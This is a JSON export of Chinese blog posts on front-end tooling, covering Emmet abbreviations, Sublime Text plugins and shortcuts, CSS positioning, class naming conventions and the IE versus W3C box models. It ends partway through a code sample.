WEB标准化布局–WEB界面设计","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"速查表","slug":"速查表","permalink":"https://ru23.com/tags/速查表/"}]},{"title":"Emmet：HTML/CSS代码快速编写神器","slug":"2018-01-Emmet：HTML-CSS代码快速编写神器","date":"2016-03-14T06:33:00.000Z","updated":"2018-10-24T03:46:02.331Z","comments":true,"path":"note/fb68b5e4.html","link":"","permalink":"https://ru23.com/note/fb68b5e4.html","excerpt":"前端开发必备！Emmet使用手册","text":"前端开发必备！Emmet使用手册 Emmet的前身是大名鼎鼎的Zen coding，如果你从事Web前端开发的话，对该插件一定不会陌生。它使用仿CSS选择器的语法来生成代码，大大提高了HTML/CSS代码编写的速度，比如下面的演示： 该插件已经改名为Emmet。但Emmet不只改名，还带来了一些新特性。 快速编写HTML代码 初始化 HTML文档需要包含一些固定的标签，比如&lt;html&gt;、&lt;head&gt;、&lt;body&gt;等，现在你只需要1秒钟就可以输入这些标签。比如输入“!”或“html:5”，然后按Tab键： html:5 或!：用于HTML5文档类型 html:xt：用于XHTML过渡文档类型 html:4s：用于HTML4严格文档类型 连续输入元素名称和ID，Emmet会自动为你补全，比如输入p#foo： 连续输入类和id，比如p.bar#foo，会自动生成：Html代码 &lt;p class=&quot;bar&quot; id=&quot;foo&quot;&gt;&lt;/p&gt; 下面来看看如何定义HTML元素的内容和属性。你可以通过输入h1{foo}和a[href=#]，就可以自动生成如下代码： &lt;h1&gt;foo&lt;/h1&gt;&lt;a href=&quot;#&quot;&gt;&lt;/a&gt; 嵌套 现在你只需要1行代码就可以实现标签的嵌套。 &gt;：子元素符号，表示嵌套的元素 +：同级标签符号 ^：可以使该符号前的标签提升一行 分组 你可以通过嵌套和括号来快速生成一些代码块，比如输入(.foo&gt;h1)+(.bar&gt;h2)，会自动生成如下代码： 123456&lt;div class=\"foo\"&gt; &lt;h1&gt;&lt;/h1&gt; &lt;/div&gt; &lt;div class=\"bar\"&gt; &lt;h2&gt;&lt;/h2&gt; &lt;/div&gt; 隐式标签 声明一个带类的标签，只需输入div.item，就会生成&lt;div class=&quot;item&quot;&gt;&lt;/div&gt; 在过去版本中，可以省略掉div，即输入.item即可生成&lt;div class=&quot;item&quot;&gt;&lt;/div&gt;。现在如果只输入.item，则Emmet会根据父标签进行判定。比如在&lt;ul&gt;中输入.item，就会生成&lt;li class=&quot;item&quot;&gt;&lt;/li&gt;。 下面是所有的隐式标签名称： li：用于ul和ol中 tr：用于table、tbody、thead和tfoot中 td：用于tr中 option：用于select和optgroup中 定义多个元素 要定义多个元素，可以使用*符号。比如，ul&gt;li*3可以生成如下代码： 12345&lt;ul&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt; &lt;li&gt;&lt;/li&gt;&lt;/ul&gt; 定义多个带属性的元素 如果输入 ul&gt;li.item$*3，将会生成如下代码： 12345&lt;ul&gt; &lt;li class=\"item1\"&gt;&lt;/li&gt; &lt;li class=\"item2\"&gt;&lt;/li&gt; &lt;li class=\"item3\"&gt;&lt;/li&gt; &lt;/ul&gt; CSS缩写 值 比如要定义元素的宽度，只需输入w100，即可生成 width: 100px; 除了px，也可以生成其他单位，比如输入h10p+m5e，结果如下： height: 10%; margin: 5em; 单位别名列表： p 表示% e 表示 em x 表示 ex 附加属性 可能你之前已经了解了一些缩写，比如 @f，可以生成： 1234@font-face &#123; font-family:; src:url(); &#125; 一些其他的属性，比如background-image、border-radius、font、@font-face,text-outline、text-shadow等额外的选项，可以通过“+”符号来生成，比如输入@f+，将生成： 123456789@font-face &#123; font-family: 'FontName'; src: url('FileName.eot'); src: url('FileName.eot?#iefix') format('embedded-opentype'), url('FileName.woff') format('woff'), url('FileName.ttf') format('truetype'), url('FileName.svg#FontName') format('svg'); font-style: normal; font-weight: normal; &#125; 模糊匹配 如果有些缩写你拿不准，Emmet会根据你的输入内容匹配最接近的语法，比如输入ov:h、ov-h、ovh和oh，生成的代码是相同的：overflow: hidden; 供应商前缀 如果输入非W3C标准的CSS属性，Emmet会自动加上供应商前缀，比如输入trs，则会生成： 12345-webkit-transform: ; -moz-transform: ; -ms-transform: ; -o-transform: ; transform: ; 你也可以在任意属性前加上“-”符号，也可以为该属性加上前缀。比如输入-super-foo： 12345-webkit-super-foo: ; -moz-super-foo: ; -ms-super-foo: ; -o-super-foo: ; super-foo: ; 如果不希望加上所有前缀，可以使用缩写来指定，比如-wm-trf表示只加上-webkit和-moz前缀： 123-webkit-transform: ; -moz-transform: ; transform: ; 前缀缩写如下： w 表示 -webkit- m表示 -moz- s 表示 -ms- o 表示 -o- 渐变 输入lg(left, #fff 50%, #000)，会生成如下代码： 12345background-image: -webkit-gradient(linear, 0 0, 100% 0, color-stop(0.5, #fff), to(#000));background-image: -webkit-linear-gradient(left, #fff 50%, #000);background-image: -moz-linear-gradient(left, #fff 50%, #000);background-image: -o-linear-gradient(left, #fff 50%, #000);background-image: linear-gradient(left, #fff 50%, #000); 附加功能 生成Lorem ipsum文本 引用 Lorem ipsum dolor sit amet, consectetur adipisicing elit. Libero delectus. 定制 你还可以定制Emmet插件： 添加新缩写或更新现有缩写，可修改[snippets.json][16]文件 更改Emmet过滤器和操作的行为，可修改[preferences.json][17]文件 定义如何生成HTML或XML代码，可修改[syntaxProfiles.json][18]文件 针对不同编辑器的插件* Emmet支持的编辑器如下（链接为针对该编辑器的Emmet插件）： Sublime Text 2 TextMate 1.x Eclipse/Aptana Coda 1.6 and 2.x Espresso Chocolat （通过“Install Mixin”对话框添加) Komodo Edit/IDE （通过Tools → Add-ons菜单添加) Notepad++ PSPad textarea CodeMirror2/3 Brackets Emmet官网文档： emmet插件下载中心 GitHub主页 emmet快捷键表 emmet文档","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Emmet","slug":"Emmet","permalink":"https://ru23.com/tags/Emmet/"}]},{"title":"Sublime使用详细总结","slug":"2016-03-Sublime使用详细总结","date":"2016-03-14T05:37:18.000Z","updated":"2018-10-24T03:46:01.555Z","comments":true,"path":"note/35c2a187.html","link":"","permalink":"https://ru23.com/note/35c2a187.html","excerpt":"Sublime使用详细总结","text":"Sublime使用详细总结 【导读】 Sublime Text具有漂亮的用户界面和强大的功能，例如代码缩略图，多重选择，快捷命令等。SublimeText更妙的是它的可扩展性。SublimeText：一款具有代码高亮、语法提示、自动完成且反应快速的编辑器软件，不仅具有华丽的界面，还支持插件扩展机制，用她来写代码，绝对是一种享受。相比于难于上手的Vim，浮肿沉重的Eclipse，VS，即便体积轻巧迅速启动的Editplus、Notepad++，在SublimeText面前大略显失色，无疑这款性感无比的编辑器是Coding和Writing最佳的选择，没有之一。 一、Sublime Text 2和3的对比 相比于2，Sublime Text 3就秒启动一项，就压倒性地胜利了。因此在之后的叙述中都以Sublime Text 3为主角。并且3一直在不断的完善更新，具体的差异可参看Sublime Blog.简单的说： ST3支持在项目目录里面寻找变量 提供了对标签页更好地支持（更多的命令和快捷键） 加快了程序运行的速度 更新了API，使用Python3.3 强烈推荐朋友们使用3! 唯快不破，不解释 二、Sublime Text 3安装插件 Sublime Text的强大就是她拥有强大的课可扩展性。您可根据自己的需要安装不同的插件；这使得她变的无比强大的同时又不失轻便。 插件安装方式一：直接安装：安装Sublime text3插件很方便，可以直接下载安装包解压缩到Packages目录（菜单-&gt;preferences-&gt;packages）。 插件安装方式二：使用Package Control组件安装：按Ctrl+`调出console（注：安装有QQ输入法的这个快捷键会有冲突的，输入法属性设置-输入法管理-取消热键切换至QQ拼音）粘贴以下代码到底部命令行并回车：如果是text2输入如下命令： 1import urllib2,os,hashlib; h = &apos;7183a2d3e96f11eeadd761d777e62404&apos; + &apos;e330c659d4bb41d3bdf022e94cab3cd0&apos;; pf = &apos;Package Control.sublime-package&apos;; ipp = sublime.installed_packages_path(); os.makedirs( ipp ) if not os.path.exists(ipp) else None; urllib2.install_opener( urllib2.build_opener( urllib2.ProxyHandler()) ); by = urllib2.urlopen( &apos;http://sublime.wbond.net/&apos; + pf.replace(&apos; &apos;, &apos;%20&apos;)).read(); dh = hashlib.sha256(by).hexdigest(); open( os.path.join( ipp, pf), &apos;wb&apos; ).write(by) if dh == h else None; print(&apos;Error validating download (got %s instead of %s), please try manual install&apos; % (dh, h) if dh != h else &apos;Please restart Sublime Text to finish installation&apos;) 如果是text3输入如下命令： 1import urllib.request,os,hashlib; h = &apos;7183a2d3e96f11eeadd761d777e62404&apos; + &apos;e330c659d4bb41d3bdf022e94cab3cd0&apos;; pf = &apos;Package Control.sublime-package&apos;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( &apos;http://sublime.wbond.net/&apos; + pf.replace(&apos; &apos;, &apos;%20&apos;)).read(); dh = hashlib.sha256(by).hexdigest(); print(&apos;Error validating download (got %s instead of %s), please try manual install&apos; % (dh, h)) if dh != h else open(os.path.join( ipp, pf), &apos;wb&apos; ).write(by) 重启Sublime Text 3。如果在Perferences-&gt;package settings中看到package control这一项，则安装成功。按下Ctrl+Shift+P调出命令面板输入install 调出 Install Package 选项并回车，然后在列表中选中要安装的插件。 安装好了之后，在Preferences会看到package control，如下: PS：国内使用SublimeText3，经常可能遇到无法安装可用插件问题，可remove掉Package Control重新安装下；如遇到连PackageControl也无法安装，则可以在别处拷贝一份关于Package Control的文件－(Package Control.sublime-package)存放于Installed Packages目录之下即可 三、Sublime Text 3插件推荐无插件，不神器！根据自己的需要定制属于自己的强大插件集；下面是一些常用的推荐。Sublime Text3插件：增强篇20个强大的SublimeText插件 实用的sublime插件集合 Emmet 功能：编码快捷键，前端必备 简介：Emmet作为zen coding的升级版，对于前端来说，可是必备插件，如果你对它还不太熟悉，可以在其官网（http://docs.emmet.io/）上看下具体的演示视频。 使用：教程-http://docs.emmet.io/cheat-sheet/、http://peters-playground.com/Emmet-Css-Snippets-for-Sublime-Text-2/ JSFormat 功能：Javascript的代码格式化插件 简介：很多网站的JS代码都进行了压缩，一行式的甚至混淆压缩，这让我们看起来很吃力。而这个插件能帮我们把原始代码进行格式的整理，包括换行和缩进等等，是代码一目了然，更快读懂~ 使用：在已压缩的JS文件中，右键选择jsFormat或者使用默认快捷键（Ctrl+Alt+F） LESS 功能：LESS高亮插件 简介：用LESS的同学都知道，sublime没有支持less的语法高亮，所以这个插件可以帮上我们 使用：打开.less文件或者设置为less格式 Less2CSS 功能：编译Less 简介：监测到文件改动时，编译保存为.css文件 使用：打开.less文件，编写代码保存即可看到同时生成.css的文件，如果没有则需要安装node。不推荐用这种方法编译，要么用koala，要么就用grunt编译。 Alignment 功能：”=”号对齐 简介：变量定义太多，长短不一，可一键对齐 使用：默认快捷键Ctrl+Alt+A和QQ截屏冲突，可设置其他快捷键如：Ctrl+Shift+Alt+A；先选择要对齐的文本 sublime-autoprefixer 功能：CSS添加私有前缀 简介：CSS还未标准化，所以要给各大浏览器一个前缀以解决兼容问题 使用：Ctrl+Shift+P，选择autoprefixer即可。需要安装node.js。 其他设置如快捷键请参考：https://sublime.wbond.net/packages/Autoprefixer Clipboard History 功能：粘贴板历史记录 简介：方便使用复制/剪切的内容 使用： Ctrl+alt+v：显示历史记录Ctrl+alt+d：清空历史记录Ctrl+shift+v：粘贴上一条记录（最旧）Ctrl+shift+alt+v：粘贴下一条记录（最新） Bracket Highlighter 功能：代码匹配 简介：可匹配[], (), {}, “”, ”, ，高亮标记，便于查看起始和结束标记 使用：点击对应代码即可 Git 功能：git管理 简介：插件基本上实现了git的所有功能 使用：https://github.com/kemayo/sublime-text-git/wiki jQuery 功能：jQ函数提示 简介：快捷输入jQ函数，是偷懒的好方法 Doc​Blockr 功能：生成优美注释 简介：标准的注释，包括函数名、参数、返回值等，并以多行显示，手动写比较麻烦 使用：输入/*、/**然后回车，还有很多用法，请参照 https://sublime.wbond.net/packages/DocBlockr Color​Picker 功能：调色板 简介：需要输入颜色时，可直接选取颜色 使用：快捷键Windows: ctrl+shift+c ConvertToUTF8 功能：文件转码成utf-8 简介：通过本插件，您可以编辑并保存目前编码不被 Sublime Text 支持的文件，特别是中日韩用户使用的 GB2312，GBK，BIG5，EUC-KR，EUC-JP ，ANSI等。ConvertToUTF8 同时支持 Sublime Text 2 和 3。 使用：安装插件后自动转换为utf-8格式 AutoFileName 功能：快捷输入文件名 简介：自动完成文件名的输入，如图片选取 使用：输入”/”即可看到相对于本项目文件夹的其他文件 Nodejs 功能：node代码提示 教程：https://sublime.wbond.net/packages/Nodejs IMESupport 功能：sublime中文输入法 简介：还在纠结 Sublime Text 中文输入法不能跟随光标吗？试试「IMESupport 」这个插件吧！目前只支持 Windows，在搜索等界面不能很好的跟随光标。 使用：Ctrl + Shift + P →输入pci →输入IMESupport →回车 Trailing spaces 功能：检测并一键去除代码中多余的空格 简介：还在纠结代码中有多余的空格而显得代码不规范？或是有处女座情节？次插件帮你实现发现多余空格、一键删除空格、保存时自动删除多余空格，让你的代码规范清爽起来 使用：安装插件并重启，即可自动提示多余空格。一键删除多余空格：CTRL+SHITF+T（需配置），更多配置请点击标题。快捷键配置：在Preferences / Key Bindings – User加上代码（数组内） { &quot;keys&quot;: [&quot;ctrl+shift+t&quot;], &quot;command&quot;: &quot;delete_trailing_spaces&quot; } FileDiffs 功能：强大的比较代码不同工具 简介：比较当前文件与选中的代码、剪切板中代码、另一文件、未保存文件之间的差别。可配置为显示差别在外部比较工具，精确到行。 使用：右键标签页，出现FileDiffs Menu或者Diff with Tab…选择对应文件比较即可 GBK Encoding Support 功能：中文识别 简介：Sublime Text 2可识别UTF-8格式的中文，不识别GBK和ANSI，因此打开很多含中文的文档都会出现乱码。可以通过安装插件GBK Support,来识别GBK和ANSI。 使用： Open a GBK FileSave file with GBK encodingChange file encoding from utf8 to GBK or GBK to utf8 Git​Gutter 简介：指示代码中插入、修改、删除的地方 其他插件 AutoFileName SublimeLinter-json SublimeLinter-jslint SublimeLinter-html-tidy SideBarEnhancements Terminal Highlighter Color Highlighter HTMLAttributes StringEncode HTML-CSS-JS Prettify MarkDown Editing SublimeText不仅仅是能够查看和编辑 Markdown 文件，但它会视它们为格式很糟糕的纯文本。这个插件通过适当的颜色高亮和其它功能来更好地完成这些任务。 关于如何在SublimeText下高效些东西可参见文章：sublime text 2(3)下的Markdown写作 抑或是追寻高效工作的一路折腾㈡ SideBarFolders 打开的文件夹都太多了? 来用这个来管理文件夹，世界原来也可以这么美好。 Sublime Terminal 这个插件可以让你在Sublime中直接使用终端打开你的项目文件夹，并支持使用快捷键。 SublimeREPL 这可能是对程序员很有用的插件。SublimeREPL 允许你在 Sublime Text 中运行各种语言（NodeJS ， Python，Ruby， Scala 和 Haskell 等等）。 Ctags插件 有童鞋抱怨Sublime Text不能支持函数的跳转（比如像Eclipse那样，按住Control点击该方法或者对象，即可跳转到定义的地方； Alt+←即可回到原处）。其实Sublime Text也可以借助插件实现之（当然，有些情况下:Can not find defination）毕竟这个也是借助正则来匹配完成的。因此这个也就要求代码很规范。这个插件相对来讲会有些麻烦，具体的可以参见:Sublime Text ctags 的配置. SublimeLinter插件 SublimeLinter 是前端编码利器——Sublime Text 的一款插件，用于高亮提示用户编写的代码中存在的不规范和错误的写法，支持 JavaScript、CSS、HTML、Java、PHP、Python、Ruby 等十多种开发语言。这篇文章介绍如何在 Windows 中配置 SublimeLinter 进行 JS &amp; CSS 校验。比如写例如像lua这样的弱语言脚本代码，有这个可以规避掉很多不该有的低级错误吧？当然这也需要你SublimeLinter安装完毕之后再安装一个 SublimeLinter-lua 即可。具体的使用可以参见：借助 SublimeLinter 编写高质量的 JavaScript &amp; CSS 代码 SideBarEnhancements插件 SideBarEnhancements是一款很实用的右键菜单增强插件；在安装该插件前，在Sublime Text左侧FOLDERS栏中点击右键，只有寥寥几个简单的功能；安装了就相当于给其丰了大胸一般。更强大的是，该插件还能让我们自定义快捷键呼出某个浏览器以预览页面！这样就不用到项目目录下寻找和拖动到特定浏览器中预览了。安装此插件后，点击菜单栏的preferences-&gt;package setting-&gt;side bar-&gt;Key Building-User，键入以下代码： 1234567891011[ &#123; &quot;keys&quot;: [&quot;ctrl+shift+c&quot;], &quot;command&quot;: &quot;copy_path&quot; &#125;, //chrome &#123; &quot;keys&quot;: [&quot;f2&quot;], &quot;command&quot;: &quot;side_bar_files_open_with&quot;, &quot;args&quot;: &#123; &quot;paths&quot;: [], &quot;application&quot;: &quot;C:\\\\Users\\\\jeffj\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe&quot;, &quot;extensions&quot;:&quot;.*&quot; &#125; &#125;] 这里设置按Ctrl+Shift+C复制文件路径，按F2即可在Chrome浏览器预览效果(如果需要的话，也可以根据自己的需要为Firefox，Safari，IE，Opera等加上)，当然你也可以自己定义喜欢的快捷键，最后注意代码中的浏览器路径要以自己电脑里的文件路径为准。 HTML-CSS-JS Prettify 一款集成了格式化（美化）html、css、js三种文件类型的插件，即便html,js写在PHP文件之内。插件依赖于nodejs，因此需要事先安装nodejs，然后才可以正常运行。插件安装完成后，快捷键ctrl+shift+H完成当前文件的美化操作。插件对html、css文件的美化不是非常满意，但还可以，后面将说明如何修改css美化脚本。本人用起来超级爽的，鉴于篇幅，就不赘述，可以参见这篇介绍。 CSScomb CSS属性排序: 有时候看看自己写的CSS文件，会不会觉得属性很乱查找不易维护难？CSScomb可以按照一定的CSS属性排序规则，将杂乱无章的CSS属性进行重新排序。选中要排序的CSS代码，按Ctrl+Shift+C，即可对CSS属性重新排序了，代码从此简洁有序易维护，如果不款选代码则插件将排序文件中所有的CSS属性。当然，可以自己自定义CSS属性排序规则，打开插件目录里的CSScomb.sublime-settings文件，更改里面的CSS属性顺序就行了。因为这个插件使用PHP写的，要使他工作需要在环境变量中添加PHP的路径，具体请看github上的说明。 SublimeTmpl 快速生成文件模板 一直都很奇怪为什么sublime text 3没有新建文件模板的功能，像html头部的DTD声明每次都要复制粘贴。用SublimeTmpl这款插件终于可以解脱了，SublimeTmpl能新建html、css、javascript、php、python、ruby六种类型的文件模板，所有的文件模板都在插件目录的templates文件夹里，可以自定义编辑文件模板。SublimeTmpl默认的快捷键: ctrl+alt+h htmlctrl+alt+j javascriptctrl+alt+c cssctrl+alt+p phpctrl+alt+r rubyctrl+alt+shift+p python Javascript-API-Completions: 支持Javascript、JQuery、Twitter Bootstrap框架、HTML5标签属性提示的插件，是少数支持sublime text 3的后缀提示的插件，HTML5标签提示sublime text3自带，不过JQuery提示还是很有用处的，也可设置要提示的语言。 WakaTime — 记录你的Code时间;WakaTime可以做到精确地统计到你花在某个项 目上的时间;WakaTime针对不同的IDE，拥有不同的插件，在Sublime上安装着插件，就能统计到我使用Sublime进行的所有项目的行为。可以高效管理和知晓自己code时间 Waka的基本设计和rescuetime类似。每个人注册完将获取一个key，装一个客户端，把key输进去（登陆是同一个道理），然后它就把本地的所有行为带个key扔给服务器来统计，一段时间之后给你个报表。不过Waka做的真的很精准，精确到每一个文件用了多少秒，每一种语言用了多少时间。 安装和使用都很简单，请参见这里。另外一篇比较详细的文章时间都去哪了?用RescueTime和WakaTime来记录你的时间,对RescueTime和WakaTime有一个更为详细的叙述，可以一读 四、定制属于自己的快捷键 首先要会使用SublimeText内置的快捷键： 比如 Commond Shift P 打开命令面板:例如打开Package Control安装各种插件；可以可以输入Set(Snytax)来改变使用的语言环境，瞬间切换等等。 设置快捷键。在SublimeText里 [ { “keys”: [“ctrl+f9”], “command”: “build” }, { “keys”: [“f10”], “command”: “build”, “args”: {“variant”: “Run”} }, { “keys”: [“ctrl+shift+x”], “command”: “toggle_comment”, “args”: { “block”: true } },] 具体可参见这边文章Sublime Text3 快捷键汇总及设置快捷键配置环境变量 sublime中的vim模式配置：在Reference-&gt; User Settings 选项，点击进入配置文件编辑状态请添加如下的内容 “ignored_packages”: []然后使用 Ctrl+S 快捷键进行保存，这时候编辑文件，只要按下键盘上的ESC键就可以进入VIM模式了，可以使用VIM的快捷键 常用快捷键表 五、定制属于自己的个性化主题我想合适的主题和配色是能够潜在提高工程师效率的重要工具，虽然用白底黑字的记事本也能写出稳固高效的代码，但是为了我们的心情和眼睛，还是选几款好的配色比较好。前端工程师对设计和美学更加敏锐，虽然不是设计师，但我们知道“什么是美的”。在Sublime Text中改变视觉效果有两部分设置，分别是代码高亮的“配色”以及编辑器本身的“主题”（包括了Tab栏、侧边栏以及Command窗口等）。顺便插播一下，最新版本的Sublime Text 3能够指定侧边栏的文件图标了~ 记得知乎上有为什么大部分程序员都喜欢用黑色界面这样的问题，嗯…… 不管你使用亮色系还是暗色系的主题（事实上我在不同的编辑器分别用了这两种），下面这几种都非常值得推荐 Material Theme：非常推荐的主题 9 个最佳的 Sublime Text 2/3 主题 Spacegray 一个最小化的设计可以帮你把注意力放在编写代码上，该主题在 UI 上没什么吸引人之处，但很适合编码。 Solarized 非常精确的颜色设置，这些颜色在不同的设备和不同的亮度环境下测试过 Glacier 颜色很丰富，使用流行的扁平设计风格。 Predawn Predawn 非常漂亮，特别适合编写代码。 Flatland Flatland 是一个基于 Soda 构建的 Sublime Text 主题，看起来不错 Tron Legacy Tron 电影迷们可能会喜欢这一款主题，因为颜色相似 ITG:Flat 另外一个扁平化设计风格主题 Tomorrow Theme Tomorrow 主题颜色丰富，有着强烈的对比 Brogrammar 扁平而且性感的设计。 附录参考文章： sublime推荐必备插件 如何优雅地使用Sublime Text","categories":[{"name":"工欲善其事必先利其器","slug":"工欲善其事必先利其器","permalink":"https://ru23.com/categories/工欲善其事必先利其器/"}],"tags":[{"name":"sublime","slug":"sublime","permalink":"https://ru23.com/tags/sublime/"}]},{"title":"Sublime Text添加插入带当前时间作者详细说明","slug":"2016-03-Sublime-Text添加插入带当前时间作者详细说明","date":"2016-03-03T08:40:12.000Z","updated":"2018-10-24T03:46:01.543Z","comments":true,"path":"note/9b02e30a.html","link":"","permalink":"https://ru23.com/note/9b02e30a.html","excerpt":"创建插件：","text":"创建插件： Tools → New Plugin: 12345678910111213import datetimeimport sublime_pluginclass AddInfoCommand(sublime_plugin.TextCommand): def run(self, edit): self.view.run_command(&quot;insert_snippet&quot;, &#123; &quot;contents&quot;: &quot;/**&quot;&quot;\\n&quot; &quot; * @Author: name&quot;&quot;\\n&quot; &quot; * @DateTime: &quot; &quot;%s&quot; %datetime.datetime.now().strftime(&quot;%Y-%m-%d %H:%M:%S&quot;) +&quot;\\n&quot; &quot; * @Description: Description&quot;&quot;\\n&quot; &quot; */&quot; &#125; ) 保存为Sublime Text 2\\Packages\\User\\ addInfo.py 创建快捷键：Preference → Key Bindings - User: 12345678[ &#123; &quot;command&quot;: &quot;add_info&quot;, &quot;keys&quot;: [ &quot;ctrl+shift+,&quot; ] &#125;] 此时使用快捷键 ctrl+shift+, 即可在当前光标处插入当前时间，如下：","categories":[{"name":"工欲善其事必先利其器","slug":"工欲善其事必先利其器","permalink":"https://ru23.com/categories/工欲善其事必先利其器/"}],"tags":[{"name":"sublime","slug":"sublime","permalink":"https://ru23.com/tags/sublime/"}]},{"title":"绝对定位与相对定位","slug":"2015-12-绝对定位与相对定位","date":"2015-12-30T08:24:08.000Z","updated":"2018-10-24T06:43:09.109Z","comments":true,"path":"note/6f1a8b1.html","link":"","permalink":"https://ru23.com/note/6f1a8b1.html","excerpt":"","text":"层级关系为：1234567891011121314151617181920212223&lt;div ——————————— position:relative; 不是最近的祖先定位元素，不是参照物&lt;div—————————-没有设置为定位元素，不是参照物&lt;div———————- position:relative 参照物&lt;div box1&lt;div box2 ——–position:absolute; top:50px; left:120px;&lt;div box3```&lt;!--more--&gt;效果图：![](http://pic002.cnblogs.com/images/2012/422101/2012072618164674.jpg)---为改变参照物（橘色框）后的效果层级关系为：```html&lt;div ——————————— position:relative;最近的祖先定位元素，参照物&lt;div—————————-没有设置为定位元素，不是参照物&lt;div———————-没有设置为定位元素，不是参照物&lt;div box1&lt;div box2 ——–position:absolute; top:50px; left:120px;&lt;div box3 效果图： 参照物为最顶级的元素情况。 层级关系为：123456&lt;div ———————————没有设置为定位元素，不是参照物&lt;div—————————-没有设置为定位元素，不是参照物&lt;div———————-没有设置为定位元素，不是参照物&lt;div box1&lt;div box2 ——–position:absolute; top:50px; left:120px;&lt;div box3 效果图： 导图总结","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://ru23.com/tags/CSS/"}]},{"title":"DIV企业命名参考","slug":"2015-12-div企业命名参考","date":"2015-12-14T06:09:08.000Z","updated":"2018-10-24T03:46:01.451Z","comments":true,"path":"note/63d5a9a7.html","link":"","permalink":"https://ru23.com/note/63d5a9a7.html","excerpt":"网页内容类","text":"网页内容类 标题: title 摘要: summary 箭头： arrow 商标： label 网站标志： logo 转角/圆角： corner 横幅广告： banner 子菜单： subMenu 搜索： search 搜索框： searchBox 登录： login 登录条：loginbar 工具条： toolbar 下拉： drop 标签页： tab 当前的： current 列表： list 滚动： scroll 服务： service 提示信息： msg 热点：hot 新闻： news 小技巧： tips 下载： download 栏目标题： title 热点： hot 加入： joinus 注册： regsiter 指南： guide 友情链接： friendlink 状态： status 版权： copyright 按钮： btn 合作伙伴： partner 投票： vote 左右中：left right center 注释的写法:/ Footer /内容区/ End Footer / id的命名: 页面结构 容器: container 页头：header 内容：content/container 页面主体：main 页尾：footer 导航：nav 侧栏：sidebar 栏目：column 页面外围控制整体布局宽度：wrapper 左右中：left right center 导航 导航：nav 主导航：mainbav 子导航：subnav 顶导航：topnav 边导航：sidebar 左导航：leftsidebar 右导航：rightsidebar 菜单：menu 子菜单：submenu 标题: title 摘要: summary 功能 标志：logo 广告：banner 登陆：login 登录条：loginbar 注册：regsiter 搜索：search 功能区：shop 标题：title 加入：joinus 状态：status 按钮：btn 滚动：scroll 标签页：tab 文章列表：list 提示信息：msg 当前的: current 小技巧：tips 图标: icon 注释：note 指南：guild 服务：service 热点：hot 新闻：news 下载：download 投票：vote 合作伙伴：partner 友情链接：link 版权：copyright class的命名: 颜色:使用颜色的名称或者16进制代码,如 .red { color: red; } .f60 { color: #f60; } .ff8600 { color: #ff8600; } 字体大小,直接使用”font+字体大小”作为名称,如 .font12px { font-size: 12px; } .font9px {font-size: 9pt; } 对齐样式,使用对齐目标的英文名称,如 .left { float:left; } .bottom { float:bottom; } 标题栏样式,使用”类别+功能”的方式命名,如 .barnews { } .barproduct { } 注意事项:: 一律小写; 尽量用英文; 不加中杠和下划线; 尽量不缩写，除非一看就明白的单词. 【推荐的 CSS 书写顺序】： 显示属性 display list-style position float clear 自身属性 width height margin padding border background 文本属性 color font text-decoration text-align vertical-align white-space other text content","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"前端规范","slug":"前端规范","permalink":"https://ru23.com/tags/前端规范/"}]},{"title":"标准盒子模型和IE盒子模型","slug":"2015-12-标准盒子模型和IE盒子模型","date":"2015-12-05T10:50:32.000Z","updated":"2018-10-24T03:46:01.469Z","comments":true,"path":"note/85343e48.html","link":"","permalink":"https://ru23.com/note/85343e48.html","excerpt":"标准盒子模型","text":"标准盒子模型 盒子模型是css中一个重要的概念，理解了盒子模型才能更好的排版。其实盒子模型有两种，分别是 ie 盒子模型和标准 w3c 盒子模型。他们对盒子模型的解释各不相同，先来看看我们熟知的标准盒子模型 从上图可以看到标准 w3c 盒子模型的范围包括 margin、border、padding、content，并且 content部分不包含其他部分 IE盒子模型 从上图可以看到 ie盒子模型的范围也包括 margin、border、padding、content 和标准 w3c 盒子模型不同的是：ie 盒子模型的 content 部分包含了 border和 padding IE盒子模型width = padding+border+内容 标准盒子模型 = 内容的宽度（不包含border+padding） 例： 一个盒子的 margin为 20px，border 为 1px，padding为 10px，content 的宽为 200px、高为 50px，假如用标准 w3c 盒子模型解释，那么这个盒子需要占据的位置为：宽 20*2+1*2+10*2+200=262px、高 20*2+1*2*10*2+50=112px，盒子的实际大小为：宽 1*2+10*2+200=222px、高 1*2+10*2+50=72px；假如用ie 盒子模型，那么这个盒子需要占据的位置为：宽 20*2+200=240px、高 20*2+50=70px，盒子的实际大小为：宽 200px、高 50px 那应该选择哪中盒子模型呢？当然是“标准 w3c 盒子模型”了。怎么样才算是选择了“标准 w3c盒子模型”呢？很简单，就是在网页的顶部加上 doctype 声明。 假如不加doctype 声明，那么各个浏览器会根据自己的行为去理解网页，即 ie浏览器会采用 ie 盒子模型去解释你的盒子，而 ff会采用标准 w3c 盒子模型解释你的盒子，所以网页在不同的浏览器中就显示的不一样了。 反之，假如加上了 doctype 声明，那么所有浏览器都会采用标准 w3c盒子模型去解释你的盒子，网页就能在各个浏览器中显示一致了。 再用 jquery 做的例子来证实一下 123456789101112&lt;html&gt;&lt;head&gt;&lt;title&gt;你用的盒子模型是？&lt;/title&gt;&lt;script language=\"javascript\" src=\"jquery.min.js\"&gt;&lt;/script&gt;&lt;script language=\"javascript\"&gt;var sbox = $.boxmodel ? \"标准w3c\":\"ie\";document.write(\"您的页面目前支持：\"+sbox+\"盒子模型\");&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 上面的代码没有加上 doctype 声明，在 ie 浏览器中显示 ie盒子模型，在 ff 浏览器中显示“标准w3c 盒子模型”。 12345678910111213&lt;!doctype html public \"-//w3c//dtd xhtml 1.0 transitional//en\" \"http://www.w3.org/tr/xhtml1/dtd/xhtml1-transitional.dtd\"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;你用的盒子模型是标准w3c盒子模型&lt;/title&gt;&lt;script language=\"javascript\" src=\"jquery.min.js\"&gt;&lt;/script&gt;&lt;script 